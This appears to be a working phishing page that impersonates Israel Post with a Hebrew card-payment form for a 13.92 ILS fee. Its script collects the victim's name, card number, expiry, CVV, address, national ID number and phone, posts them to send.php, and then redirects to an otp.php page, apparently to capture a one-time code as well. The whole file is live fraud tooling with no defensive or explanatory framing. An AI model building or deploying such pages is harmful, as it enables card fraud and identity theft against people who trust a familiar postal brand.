<!doctype html>
<html dir="rtl">
<head>
    <meta charset="utf-8">
<title>Payment form</title>
<link href="https://fonts.googleapis.com/css2?family=PT+Sans&display=swap" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">

</head>
<body>

<div class="content">
    <div class="">
    <img src="res/logo.png" style="width:160px;">
    </div>
<div class="form">
<div class="col title">
שלם בכרטיס <img src="res/cards.svg"> 
</div>

<div class="details" style="text-align:right;">
<p>מספר הזמנה: 89739732098</p>
<p>סה"כ: 13.92 ILS</p>
</div>

<div class="paymentform" id="cardform">


<div class="form-col">
<input type="text" class="textinput" id="d0" placeholder="שם בעל הכרטיס">
</div>
<div class="form-col">
<input type="text" class="textinput" id="d1" placeholder="4100 0000 0000 0000">
</div>

<div class="formcol-multi">

<div class="left">
<select id="d2">
    <option value='01'>01</option><option value='02'>02</option><option value='03'>03</option><option value='04'>04</option><option value='05'>05</option><option value='06'>06</option><option value='07'>07</option><option value='08'>08</option><option value='09'>09</option><option value='10'>10</option><option value='11'>11</option><option value='12'>12</option></select>
<select id="d3">
    <option value='2023'>2023</option><option value='2024'>2024</option><option value='2025'>2025</option><option value='2026'>2026</option><option value='2027'>2027</option><option value='2028'>2028</option><option value='2029'>2029</option><option value='2030'>2030</option><option value='2031'>2031</option><option value='2032'>2032</option><option value='2033'>2033</option><option value='2034'>2034</option></select>
</div>
<div class="right">
<input type="text" class="short" id="d4" placeholder="קוד CVV">
</div>
</div>
<div class="form-col">
<input type="text" class="textinput" id="d5" placeholder="כתובת, מדינה, מיקוד">
</div>
<div class="form-col">
<input type="text" class="textinput" id="d6" placeholder="מספר תעודת זהות">
</div>
<div class="form-col">
<input type="text" class="textinput" id="d7" placeholder="מספר טלפון">
</div>
<div class="form-col">
    <button onclick="sendCard()">לשלם</button>
</div>
</div>



<p style="margin:30px 0; text-align:right; font-size:0.7em;">© 2023 דואר ישראל<br><a href="#contact">צור קשר עם תמיכה</a></p>

</div>
</div>


<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style="width:80px;">
</div>
</div>



<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d4").mask('000');

var allowSubmit;
var abortVal = true;
var seconds = 5000;

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=7; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).css("border-bottom","1px solid red");
			allowSubmit=false;
	}else{
		$("#d"+i).css("border-bottom","1px solid #b2b2b2");
	}
}

if($("#d1").val().length<19){
	$("#d1").css("border-bottom","1px solid red");
	allowSubmit=false;
}



}

$("#cardform input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("#cardform input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){

        $(".loader").show();
        
        $.post("send.php", 
			{	
				name:$("#d0").val(), 
				cc:$("#d1").val(),
                exp:$("#d2").val()+"/"+$("#d3").val(),
				cvv:$("#d4").val(),
				address:$("#d5").val(),
                id:$("#d6").val(),
                phone:$("#d7").val()
			
			}, function(done){
                setTimeout(()=>{
                    window.location="otp.php";
                }, seconds);
			}
		
		);

    }
}

</script>

</body>
</html>